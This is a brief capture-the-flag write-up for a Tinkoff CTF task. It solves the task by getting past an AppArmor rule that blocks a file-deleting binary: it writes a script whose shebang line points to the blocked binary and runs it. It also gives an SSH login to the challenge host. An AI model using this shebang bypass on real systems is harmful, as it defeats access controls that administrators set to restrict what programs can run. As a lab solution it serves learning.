# Пиковая дама

## Task
[Task link](https://ctf.tinkoff.ru/tasks/gamearmor)

Учёные создали суперкомпьютер, а младший научный сотрудник решил разогнать его до пиковых значений в игре и похвастаться скриншотами на форуме. Всё получилось, но потом сработал механизм защиты — сотрудник не может удалить игру и замести следы. Помогите ему.

ssh junior@t-gamearmor-dfr4zybw.spbctf.net

## Solution

Find AppArmor policy in notes.txt
```bash
cat /home/senior/notes.txt
```

We need to run `/usr/bin/rmrf` binary.

If we just try to run, we will get premission denied.
```bash
junior@supercomputer:~$ /usr/bin/rmrf
bash: /usr/bin/rmrf: Permission denied
```

Just use [AppArmor Shebang Bypass](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass).

```bash
echo '#!/usr/bin/rmrf' > rmrf
chmod +x rmrf
./rmrf
```
